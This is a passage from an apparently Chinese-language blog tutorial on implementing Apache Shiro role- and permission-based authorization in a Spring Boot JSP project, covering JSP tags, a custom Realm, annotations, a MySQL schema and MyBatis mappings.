<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">JSP/GSP 标签：在JSP/GSP 页面通过相应的标签完成：</span><br><span class="line"><span class="tag">&lt;<span class="name">shiro:hasRole</span> <span class="attr">name</span>=<span class="string">"admin"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 有权限 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">shiro:hasRole</span>&gt;</span></span><br><span class="line">注意：Thymeleaf 中使用shiro需要额外集成!</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="授权实现"><a href="#授权实现" class="headerlink" title="授权实现"></a>授权实现</h2><p>首先模拟一下假数据，不操作数据库</p>
<p>在CustomerRealm下有一个doGetAuthorizationInfo方法</p>
<p>这里就负责授权的操作</p>
<p>现在就假设普通用户能看到用户管理  admin可以看到所有的菜单</p>
<p>标签式：<br>shiro标签引入<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;%@taglib <span class="attribute">prefix</span>=<span class="string">"shiro"</span> <span class="attribute">uri</span>=<span class="string">"http://shiro.apache.org/tags"</span>%&gt;</span><br></pre></td></tr></table></figure></p>
<p>在index.jsp添加上shiro标签<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">shiro:hasAnyRoles</span> <span class="attr">name</span>=<span class="string">"user,admin"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>用户管理<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">shiro:hasPermission</span> <span class="attr">name</span>=<span class="string">"user:add:*"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>添加<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">shiro:hasPermission</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">shiro:hasPermission</span> <span class="attr">name</span>=<span class="string">"user:delete:*"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>删除<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">shiro:hasPermission</span>&gt;</span> </span><br><span class="line">                <span class="tag">&lt;<span class="name">shiro:hasPermission</span> <span class="attr">name</span>=<span class="string">"user:update:*"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>修改<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">shiro:hasPermission</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">shiro:hasPermission</span> <span class="attr">name</span>=<span class="string">"user:find:*"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>查询<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">shiro:hasPermission</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">shiro:hasAnyRoles</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">shiro:hasRole</span> <span class="attr">name</span>=<span class="string">"admin"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>商品管理<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>订单管理<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>物流管理<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">shiro:hasRole</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>CustomerRealm中写上对应的授权方法<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">@Override</span><br><span class="line">protected AuthorizationInfo <span class="keyword">do</span><span class="constructor">GetAuthorizationInfo(PrincipalCollection <span class="params">principalCollection</span>)</span> &#123;</span><br><span class="line">    <span class="comment">//获取身份信息</span></span><br><span class="line">    String primaryPrincipal = (String) principalCollection.get<span class="constructor">PrimaryPrincipal()</span>;</span><br><span class="line">    <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"调用授权验证："</span>+primaryPrincipal);</span><br><span class="line">    <span class="comment">//根据主身份信息获取角色和权限信息</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="string">"xiaochen"</span>.equals(primaryPrincipal))&#123;</span><br><span class="line">        SimpleAuthorizationInfo simpleAuthorizationInfo = <span class="keyword">new</span> <span class="constructor">SimpleAuthorizationInfo()</span>;</span><br><span class="line"></span><br><span class="line">        simpleAuthorizationInfo.add<span class="constructor">Role(<span class="string">"user"</span>)</span>;</span><br><span class="line"></span><br><span class="line">        simpleAuthorizationInfo.add<span class="constructor">StringPermission(<span class="string">"user:find:*"</span>)</span>;</span><br><span class="line">        simpleAuthorizationInfo.add<span class="constructor">StringPermission(<span class="string">"user:update:*"</span>)</span>;</span><br><span class="line"></span><br><span class="line">        return simpleAuthorizationInfo;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>现在xiaochen这个账号就是个普通用户 可以看到用户管理  并且对所有文件都具有修改和查找的操作权力 他只能看见修改和查找的功能  看到不添加删除功能</p>
<p>这就完成了通过标签的方式完成了授权的操作，实际开发中一般不会使用这种方式去完成授权操作</p>
<p>代码式：<br>创建一个OrderController<br><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ceit.springboot_jsp_shiro.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.SecurityUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.Subject;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.<span class="keyword">annotation</span>.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(<span class="meta-string">"order"</span>)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(<span class="meta-string">"save"</span>)</span></span><br><span class="line">    <span class="keyword">public</span> String save()&#123;</span><br><span class="line">        <span class="comment">//获取主体对象</span></span><br><span class="line">        Subject subject = SecurityUtils.getSubject();</span><br><span class="line">        <span class="comment">//代码方式</span></span><br><span class="line">        <span class="keyword">if</span> (subject.hasRole(<span class="string">"admin"</span>)) &#123;</span><br><span class="line">            System.<span class="keyword">out</span>.println(<span class="string">"保存订单"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.<span class="keyword">out</span>.println(<span class="string">"无权访问"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//基于权限字符串</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="string">"redirect:/index.jsp"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这是个简单的演示  如果xiaochen是admin  那就控制台输出保存订单</p>
<p>注解式：<br>将上面的代码添加上一个注解即可<br><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="variable">@RequestMapping</span>(<span class="string">"save"</span>)</span><br><span class="line"><span class="variable">@RequiresRoles</span>(<span class="string">"admin"</span>)<span class="comment">//用来判断角色</span></span><br></pre></td></tr></table></figure><br>如果要判断多个角色<br><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequiresRoles(value=&#123;<span class="meta-string">"admin"</span>,<span class="meta-string">"user"</span>&#125;)</span><span class="comment">//用来判断角色  同时具有admin和user身份</span></span><br></pre></td></tr></table></figure></p>
<p>还有判断权限字符串的注解<br><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequiresPermissions(<span class="meta-string">"user:update:01"</span>)</span> <span class="comment">//用来判断权限字符串</span></span><br></pre></td></tr></table></figure></p>
<h2 id="授权数据持久化"><a href="#授权数据持久化" class="headerlink" title="授权数据持久化"></a>授权数据持久化</h2><h3 id="角色信息获取"><a href="#角色信息获取" class="headerlink" title="角色信息获取"></a>角色信息获取</h3><p>首先要完成通过数据库授权的操作，自然是先要去设计一下库表了</p>
<p>这里就不讲过程了 直接贴sql文件<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Navicat MySQL Data Transfer</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Source Server         : localhost</span></span><br><span class="line"><span class="comment">Source Server Version : 80020</span></span><br><span class="line"><span class="comment">Source Host           : localhost:3306</span></span><br><span class="line"><span class="comment">Source Database       : shiro_spring</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Target Server Type    : MYSQL</span></span><br><span class="line"><span class="comment">Target Server Version : 80020</span></span><br><span class="line"><span class="comment">File Encoding         : 65001</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Date: 2020-12-07 17:40:29</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span> FOREIGN_KEY_CHECKS=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Table structure for t_pers</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`t_pers`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`t_pers`</span> (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  <span class="string">`name`</span> <span class="built_in">varchar</span>(<span class="number">80</span>) <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`url`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Table structure for t_role</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`t_role`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`t_role`</span> (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  <span class="string">`name`</span> <span class="built_in">varchar</span>(<span class="number">60</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Table structure for t_role_perms</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`t_role_perms`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`t_role_perms`</span> (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`roleid`</span> <span class="built_in">int</span> <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`permsid`</span> <span class="built_in">int</span> <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Table structure for t_user</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`t_user`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`t_user`</span> (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  <span class="string">`username`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`password`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`salt`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> AUTO_INCREMENT=<span class="number">5</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Table structure for t_user_role</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`t_user_role`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`t_user_role`</span> (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`userid`</span> <span class="built_in">int</span> <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`roleid`</span> <span class="built_in">int</span> <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br></pre></td></tr></table></figure></p>
<p>t_role表内容:</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>id</th>
<th>name</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>admin</td>
</tr>
<tr>
<td>2</td>
<td>user</td>
</tr>
<tr>
<td>3</td>
<td>product</td>
</tr>
</tbody>
</table>
</div>
<p>t_user_role表内容：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>id</th>
<th>userid</th>
<th>roleid</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>2</td>
<td>2</td>
<td>2</td>
</tr>
<tr>
<td>3</td>
<td>2</td>
<td>3</td>
</tr>
</tbody>
</table>
</div>
<p><img src="/img/JavaWeb/12-7学习日记/0.png" alt="avatar"></p>
<p>接着就是构建实体类Perms 和 Role</p>
<p>Role:<br><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">package com.ceit.springboot_jsp_shiro.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.experimental.Accessors;</span><br><span class="line"></span><br><span class="line">@Data</span><br><span class="line">@Accessors(chain = <span class="literal">true</span>)</span><br><span class="line">@AllArgsConstructor</span><br><span class="line">@NoArgsConstructor</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Role</span> &#123;</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> id;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">String</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">String</span> id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">String</span> <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(<span class="keyword">String</span> name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>Perms:<br><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">package com.ceit.springboot_jsp_shiro.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.experimental.Accessors;</span><br><span class="line"></span><br><span class="line">@Data</span><br><span class="line">@Accessors(chain = <span class="literal">true</span>)</span><br><span class="line">@AllArgsConstructor</span><br><span class="line">@NoArgsConstructor</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Perms</span> &#123;</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> id;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> url;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">String</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">String</span> id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">String</span> <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(<span class="keyword">String</span> name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">String</span> <span class="title">getUrl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> url;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUrl</span><span class="params">(<span class="keyword">String</span> url)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.url = url;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>User实体类中也应该添加上一个roles<br><figure class="highlight cs"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义角色集合</span></span><br><span class="line"><span class="keyword">private</span> List&lt;Role&gt; roles;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Role&gt; <span class="title">getRoles</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> roles;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setRoles</span>(<span class="params">List&lt;Role&gt; roles</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.roles = roles;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>UserDAO中开发一个查询方法<br><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">//根据用户名查询所有角色</span><br><span class="line"><span class="keyword">User</span> <span class="title">findRolesByUserName</span>(<span class="keyword">String</span> username);</span><br></pre></td></tr></table></figure></p>
<p>对应的Service一样<br><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">//根据用户名查询所有角色</span><br><span class="line"><span class="keyword">User</span> <span class="title">findRolesByUserName</span>(<span class="keyword">String</span> username);</span><br></pre></td></tr></table></figure></p>
<p>接着在UserDAOMapper.xml中添加select方法<br><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">&lt;resultMap <span class="built_in">id</span>=<span class="string">"userMap"</span> type=<span class="string">"User"</span>&gt;</span><br><span class="line">        &lt;<span class="built_in">id</span> column=<span class="string">"uid"</span> <span class="keyword">property</span>=<span class="string">"id"</span> /&gt;</span><br><span class="line">        &lt;<span class="literal">result</span> column=<span class="string">"username"</span> <span class="keyword">property</span>=<span class="string">"username"</span> /&gt;</span><br><span class="line">&lt;!<span class="comment">--        角色信息--&gt;</span></span><br><span class="line">        &lt;collection <span class="keyword">property</span>=<span class="string">"roles"</span> javaType=<span class="string">"list"</span> ofType=<span class="string">"Role"</span>&gt;</span><br><span class="line">            &lt;<span class="built_in">id</span> column=<span class="string">"id"</span> <span class="keyword">property</span>=<span class="string">"id"</span> /&gt;</span><br><span class="line">            &lt;<span class="literal">result</span> column=<span class="string">"rname"</span> <span class="keyword">property</span>=<span class="string">"name"</span> /&gt;</span><br><span class="line">        &lt;/collection&gt;</span><br><span class="line">    &lt;/resultMap&gt;</span><br><span class="line"></span><br><span class="line">    &lt;select <span class="built_in">id</span>=<span class="string">"findRolesByUserName"</span> parameterType=<span class="string">"String"</span> resultMap=<span class="string">"userMap"</span>&gt;</span><br><span class="line">        select u.<span class="built_in">id</span> uid,u.username,r.<span class="built_in">id</span>,r.<span class="built_in">name</span> rname</span><br><span class="line">        <span class="keyword">from</span> t_user u</span><br><span class="line">        left join t_user_role ur</span><br><span class="line">        <span class="keyword">on</span> u.<span class="built_in">id</span>=ur.userid</span><br><span class="line">        left join t_role r</span><br><span class="line">        <span class="keyword">on</span> ur.roleid=r.<span class="built_in">id</span></span><br><span class="line">        <span class="keyword">where</span> u.username=<span class="comment">#&#123;username&#125;;</span></span><br><span class="line">    &lt;/select&gt;</span><br></pre></td></tr></table></figure></p>
<p>接下来就是业务层的实现了<br><figure class="highlight aspectj"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="function">User <span class="title">findRolesByUserName</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">return</span> userDAO.<span class="title">findRolesByUserName</span><span class="params">(username)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>都做好了 就可以回到我们的自定义Realm了<br><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">    @Override</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> AuthorizationInfo <span class="title">doGetAuthorizationInfo</span><span class="params">(PrincipalCollection principalCollection)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//获取身份信息</span></span><br><span class="line">        <span class="keyword">String</span> primaryPrincipal = (<span class="keyword">String</span>) principalCollection.getPrimaryPrincipal();</span><br><span class="line">        System.out.<span class="built_in">println</span>(<span class="string">"调用授权验证："</span>+primaryPrincipal);</span><br><span class="line">        <span class="comment">//根据主身份信息获取角色和权限信息</span></span><br><span class="line"><span class="comment">//        if("xiaochen".equals(primaryPrincipal))&#123;</span></span><br><span class="line"><span class="comment">//            SimpleAuthorizationInfo simpleAuthorizationInfo = new SimpleAuthorizationInfo();</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//            simpleAuthorizationInfo.addRole("user");</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//            simpleAuthorizationInfo.addStringPermission("user:find:*");</span></span><br><span class="line"><span class="comment">//            simpleAuthorizationInfo.addStringPermission("user:update:*");</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//            return simpleAuthorizationInfo;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        UserService userService = (UserService) ApplicationContextUtils.getBean(<span class="string">"userService"</span>);</span><br><span class="line">        User user = userService.findRolesByUserName(primaryPrincipal);</span><br><span class="line">        <span class="comment">//授权角色信息</span></span><br><span class="line">        <span class="keyword">if</span>(!CollectionUtils.isEmpty(user.getRoles()))&#123;</span><br><span class="line">            SimpleAuthorizationInfo simpleAuthorizationInfo = <span class="keyword">new</span> SimpleAuthorizationInfo();</span><br><span class="line">            user.getRoles().forEach(role -&gt;&#123;</span><br><span class="line">                simpleAuthorizationInfo.addRole(role.getName());</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">return</span> simpleAuthorizationInfo;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> null;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>这样就完成了从写死数据到连接数据库的授权操作了</p>
<h3 id="权限信息获取"><a href="#权限信息获取" class="headerlink" title="权限信息获取"></a>权限信息获取</h3><p>获取权限信息在数据库就比较麻烦了  因为我们既需要查到他的角色信息还要查到他的权限信息</p>
<p>现在需要定义一个权限集合  但权限是绑定角色的 所以就需要在Role实体类中定义一个权限的集合<br><figure class="highlight lasso"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义权限集合</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">List</span>&lt;Perms&gt; perms;</span><br></pre></td></tr></table></figure></p>
<p>UserDAO中也添加上方法<br><figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="comment">//根据角色id查询权限集合的方法</span></span><br><span class="line">    <span class="built_in">List</span>&lt;Perms&gt; findPermsByRoleId(<span class="built_in">String</span> id);</span><br></pre></td></tr></table></figure></p>
<p>Service也加上<br><figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="comment">//根据角色id查询权限集合的方法</span></span><br><span class="line">    <span class="built_in">List</span>&lt;Perms&gt; findPermsByRoleId(<span class="built_in">String</span> id);</span><br></pre></td></tr></table></figure></p>
